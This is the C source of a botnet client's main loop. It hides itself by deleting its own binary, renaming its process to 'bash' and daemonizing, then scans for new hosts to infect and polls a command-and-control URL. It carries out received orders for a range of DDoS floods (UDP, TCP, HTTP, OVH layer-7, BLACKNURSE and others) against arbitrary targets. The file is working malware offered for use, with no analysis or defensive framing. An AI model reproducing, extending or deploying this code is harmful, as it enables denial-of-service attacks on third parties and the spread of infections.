#include "includes/px_botnet.h"

in_addr_t addr;


void ft_manage_request(char *ptr) {
    char **split;
    int split_len;

    split = ft_split(ptr, '|');
    if (split == NULL) {
        // Handle error gracefully, e.g., log it and return
        fprintf(stderr, "ft_split failed\n");
        return;
    }

    split_len = ft_split_len(split);

    if (split_len == 2 && !strncmp(split[0], "KILL", 4) && !strncmp(split[1], "iCKrBrfhaQZiqBXRcXFHWJAKcqA", 27)) {
        ft_free_split(split);
        exit(0);
    }

    if (!fork()) {
        if (split_len >= 4) {
            if (!strncmp(split[0], "OVHL7", 5) && split_len == 5)
                OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
            else if (!strncmp(split[0], "HTTPSOCKET", 3) && split_len == 5)
                HTTPSOCKET(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
            else if (!strncmp(split[0], "HTTP", 4) && split_len == 7)
                HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
            else if (!strncmp(split[0], "UDPRAW", 6))
                UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
            else if (!strncmp(split[0], "UDPPPS", 6) && split_len == 5)
                UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
            else if (!strncmp(split[0], "HOLD", 4))
                HOLD(split[1], atoi(split[2]), atoi(split[3]));
            else if (!strncmp(split[0], "JUNK", 4))
                JUNK(split[1], atoi(split[2]), atoi(split[3]));
            else if (!strncmp(split[0], "RANDHEX", 7))
                RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
            else if (!strncmp(split[0], "STD", 3))
                STD(split[1], atoi(split[2]), atoi(split[3]));
            else if (!strncmp(split[0], "UDP", 3) && split_len == 7)
                UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
            else if (!strncmp(split[0], "TCP", 3) && split_len == 8)
                TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
            else if (!strncmp(split[0], "XTDCUSTOM", 9))
                XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
        } else if (split_len == 3) {
            if (!strncmp(split[0], "BLACKNURSE", 10) && split_len == 3)
                BLACKNURSE(split[1], atoi(split[2]));
        }

        ft_free_split(split);
        exit(0);
    } else {
        // In the parent process, wait for the child process to complete
        wait(NULL);
    }
  	ft_free_split(split);
  	exit(0);
}

int main(int argc, char *argv[])
{
	char name[] = "bash";
	pthread_t ip_searcher;
	char *id;
	char *request;
	char *tmp;
	char *arch;
	pid_t pid1;
	pid_t pid2;
	int status;

	if (!DEBUG)
	{
		remove(argv[0]);
		srand(time(NULL) ^ getpid());
		strncpy(argv[0], "bash", strlen("bash"));
		argv[0] = "bash";
		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
	
		if (pid1 = fork())
		{
			waitpid(pid1, &status, 0);
			exit(0);
		}
		else if (!pid1)
			if (pid2 = fork())
				exit(0);
		setsid();
		chdir("/");
		signal(SIGPIPE, SIG_IGN);
	}
	
	arch = ft_getarch();
	id = ft_get_id();
	
	
	if (!fork())
	{
		ft_scan_world();
		exit(0);
	}

  SSL_library_init();
  OpenSSL_add_all_algorithms();
  ERR_load_crypto_strings();

	request = ft_strjoin("?id=", id);
	request = ft_strnjoinf(url_page, request, strlen(request));
	request = ft_strnjoin(request, "&arch=", strlen(request));
	request = ft_strnjoin(request, arch, strlen(request));
	while (true)
	{
		printf("request: %s\n", request);
		tmp = ft_request(request);
		printf("temp_response: %s\n", tmp);
		if (tmp)
		{
			ft_manage_request(tmp);
			free(tmp);
		}
		if (DEBUG)
			usleep(250000);
		else
			sleep(rand() % 10);
	}
	free(request);
	return (0);
}